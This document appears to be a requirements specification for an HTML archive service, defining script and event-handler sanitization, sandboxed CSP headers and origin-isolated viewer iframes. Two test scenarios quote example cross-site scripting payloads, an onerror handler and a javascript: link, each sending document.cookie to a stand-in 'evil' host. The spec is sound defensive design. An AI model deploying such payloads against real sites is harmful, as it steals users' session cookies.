## ADDED Requirements

### Requirement: Sanitization at ingest
The archive service SHALL sanitize archived HTML at ingest: `<script>` elements SHALL be removed, `on*` event-handler attributes SHALL be stripped from all elements, and URI-bearing attributes (`href`, `src`, `action`, `formaction`, `xlink:href`) SHALL have `javascript:` and `data:text/html` values neutralized (rewritten to an inert value or the attribute dropped). Sanitization SHALL run before the HTML is persisted to R2, so no stored page contains executable script payload.

#### Scenario: Inline event handler is removed
- **WHEN** archived HTML contains `<img src="a.png" onerror="fetch('//evil?t='+document.cookie)">`
- **THEN** the stored HTML contains no `onerror` attribute
- **AND** the `src` is preserved

#### Scenario: javascript: URI is neutralized
- **WHEN** archived HTML contains `<a href="javascript:document.location='//evil/'+document.cookie">x</a>`
- **THEN** the stored HTML does not execute the payload when the link is clicked in the viewer
- **AND** the anchor text is preserved

#### Scenario: Legitimate content survives sanitization
- **WHEN** archived HTML contains standard markup, inline styles, images, and forms
- **THEN** sanitization removes nothing except scripts, event handlers, and dangerous URIs
- **AND** the page renders as captured in the sandboxed viewer

### Requirement: Sandboxed serving headers for archived content
Every route that serves archived HTML or assets on the `pagepocket.app` origin — the gateway file routes (`/api/v1/share/public/{token}/f/*`, `/api/v1/archive/pages/{page_id}/f/*`) and the frontend proxy routes that forward them (`/api/sc/*`, `/api/pp/archive/*/f/*`) — SHALL set a sandboxing `Content-Security-Policy` (`sandbox allow-popups allow-forms`, explicitly without `allow-same-origin`), `X-Content-Type-Options: nosniff`, and the stored content type. HTML responses SHALL additionally set `Referrer-Policy: no-referrer`.

#### Scenario: Archived HTML served without origin privileges
- **WHEN** a viewer fetches a page's `index.html` through any serving route
- **THEN** the response carries `Content-Security-Policy: sandbox allow-popups allow-forms`
- **AND** scripts, if any were stored, cannot access pagepocket.app cookies, storage, or DOM

#### Scenario: Frontend proxy preserves sandbox headers
- **WHEN** the frontend route proxies a gateway file response
- **THEN** the sandbox CSP and `nosniff` headers set (or forwarded) by the proxy are equivalent to the gateway's
- **AND** the proxy does not serve archived content without them

#### Scenario: Assets are served with their stored content type
- **WHEN** an archived image or stylesheet is fetched through a serving route
- **THEN** the response content type matches the stored asset content type
- **AND** `X-Content-Type-Options: nosniff` prevents MIME confusion

### Requirement: Viewer iframe is origin-isolated
The page viewer SHALL render archived content in an iframe whose sandbox attribute does NOT include `allow-same-origin`. The iframe MAY retain `allow-popups` and `allow-forms` only where the product requires them, and SHALL NOT grant scripting to the archived document.

#### Scenario: Archived page cannot reach the application origin
- **WHEN** a user views an archived page in the viewer shell
- **THEN** the iframe sandbox excludes `allow-same-origin`
- **AND** code in the archived page (if it somehow executes) obtains no access to the pagepocket.app origin

#### Scenario: Viewer still functions without same-origin
- **WHEN** an archived page renders in the sandboxed iframe
- **THEN** navigation between archived pages, form controls, and assets resolve within the sandbox as designed
